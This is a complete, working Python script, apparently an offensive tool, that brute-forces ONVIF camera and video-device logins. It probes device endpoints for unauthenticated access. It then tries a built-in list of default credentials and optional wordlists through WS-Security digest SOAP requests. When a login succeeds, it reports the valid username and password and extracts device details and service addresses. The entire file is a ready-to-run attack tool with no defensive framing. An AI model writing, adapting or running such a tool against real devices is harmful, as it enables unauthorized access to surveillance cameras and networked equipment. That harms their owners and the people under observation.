#!/usr/bin/env python3
"""
onvif_brute.py — ONVIF WS-Security Brute Force
Uso: python3 onvif_brute.py <target> [--port 80] [--users file] [--passwords file]
"""

import argparse
import hashlib
import base64
import datetime
import random
import string
import sys
import urllib.request
import urllib.error
import urllib.parse

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "Admin1234"),
    ("root", "root"),
    ("operator", "operator"),
    ("service", "service"),
    ("user", "user"),
    ("admin", "password"),
    ("admin", "1234"),
    ("Admin", "admin"),
    ("admin", "9999"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("onvif", "onvif"),
]

ONVIF_ENDPOINTS = [
    "/onvif/device_service",
    "/onvif/media_service",
    "/device_service",
]

def random_str(n=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def make_password_digest(nonce_raw, created, password):
    digest = hashlib.sha1(nonce_raw + created.encode() + password.encode()).digest()
    return base64.b64encode(digest).decode()

def build_ws_security_envelope(user, password, soap_body):
    nonce_raw = random_str(16).encode()
    nonce_b64 = base64.b64encode(nonce_raw).decode()
    created = datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')
    digest = make_password_digest(nonce_raw, created, password)
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
            xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
  <s:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>{user}</wsse:Username>
        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">{digest}</wsse:Password>
        <wsse:Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">{nonce_b64}</wsse:Nonce>
        <wsu:Created>{created}</wsu:Created>
      </wsse:UsernameToken>
    </wsse:Security>
  </s:Header>
  <s:Body>
    {soap_body}
  </s:Body>
</s:Envelope>'''

SOAP_DEVICE_INFO = '<tds:GetDeviceInformation xmlns:tds="http://www.onvif.org/ver10/device/wsdl"/>'
SOAP_CAPABILITIES = '''<tds:GetCapabilities xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <tds:Category>All</tds:Category>
</tds:GetCapabilities>'''

def soap_request(url, envelope, timeout=8):
    data = envelope.encode('utf-8')
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            'Content-Type': 'application/soap+xml; charset=utf-8',
            'SOAPAction': '""',
            'User-Agent': 'exa-dune-onvif-brute/1.0',
        }
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode(errors='replace'), resp.status
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode(errors='replace')
        except Exception:
            body = ""
        return body, e.code
    except Exception:
        return None, None

def test_anonymous(url, timeout=8):
    """Test senza WS-Security"""
    envelope = f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body>
    {SOAP_DEVICE_INFO}
  </s:Body>
</s:Envelope>'''
    return soap_request(url, envelope, timeout)

def is_success(response_body):
    if not response_body:
        return False
    return any(k in response_body for k in [
        "GetDeviceInformationResponse", "Manufacturer", "Model", "FirmwareVersion",
        "SerialNumber", "GetCapabilitiesResponse"
    ])

def is_auth_error(response_body):
    if not response_body:
        return True
    return any(k in response_body for k in [
        "NotAuthorized", "Sender not Authorized", "not authorized",
        "AuthorizationFailed", "Fault", "Unauthorized"
    ])

def main():
    parser = argparse.ArgumentParser(description="ONVIF WS-Security Brute Force")
    parser.add_argument("target", help="Target IP/hostname")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--users", default=None, help="File lista utenti")
    parser.add_argument("--passwords", default=None, help="File lista password")
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    print(f"[*] ONVIF Brute Force — {args.target}:{args.port}")

    found_endpoint = None
    for ep in ONVIF_ENDPOINTS:
        url = f"http://{args.target}:{args.port}{ep}"
        print(f"[*] Probe anonimo: {url}")
        resp, code = test_anonymous(url, args.timeout)
        if code is not None:
            print(f"    HTTP {code}")
            if is_success(resp):
                print(f"[FOUND:CRITICAL] ONVIF accessibile SENZA AUTH: {url}")
                found_endpoint = url
                break
            elif is_auth_error(resp) or code in (401, 403, 500):
                print(f"    Auth richiesta su {ep}")
                found_endpoint = url
                break

    if found_endpoint is None:
        print("[!] Nessun endpoint ONVIF raggiungibile")
        sys.exit(1)

    # Brute force: prima default, poi wordlist
    all_creds = list(DEFAULT_CREDS)
    if args.users and args.passwords:
        users = []
        passwords = []
        try:
            with open(args.users) as f:
                users = [l.strip() for l in f if l.strip()]
            with open(args.passwords) as f:
                passwords = [l.strip() for l in f if l.strip()]
            for u in users:
                for p in passwords:
                    all_creds.append((u, p))
        except Exception as e:
            print(f"[!] Errore wordlist: {e}")

    print(f"\n[*] Brute force: {len(all_creds)} credenziali su {found_endpoint}")
    found_cred = None

    for user, passwd in all_creds:
        envelope = build_ws_security_envelope(user, passwd, SOAP_DEVICE_INFO)
        resp, code = soap_request(found_endpoint, envelope, args.timeout)
        if resp and is_success(resp):
            print(f"[FOUND:CRITICAL] ONVIF credenziali valide: {user}:{passwd}")
            found_cred = (user, passwd)
            break
        else:
            sys.stdout.write(f"\r    Provo: {user}:{passwd}{'':20}")
            sys.stdout.flush()

    print()

    if found_cred:
        user, passwd = found_cred
        print(f"\n[*] GetDeviceInformation con {user}:{passwd}")
        envelope = build_ws_security_envelope(user, passwd, SOAP_DEVICE_INFO)
        resp, _ = soap_request(found_endpoint, envelope, args.timeout)
        if resp:
            for tag in ["Manufacturer", "Model", "FirmwareVersion", "SerialNumber", "HardwareId"]:
                import re
                m = re.search(rf'<[^>]*{tag}[^>]*>([^<]+)<', resp)
                if m:
                    print(f"    {tag}: {m.group(1)}")

        print(f"\n[*] GetCapabilities")
        envelope = build_ws_security_envelope(user, passwd, SOAP_CAPABILITIES)
        resp, _ = soap_request(found_endpoint, envelope, args.timeout)
        if resp:
            import re
            for m in re.finditer(r'<XAddr>([^<]+)</XAddr>', resp):
                print(f"    XAddr: {m.group(1)}")
    else:
        print("[*] Nessuna credenziale valida trovata")

if __name__ == "__main__":
    main()
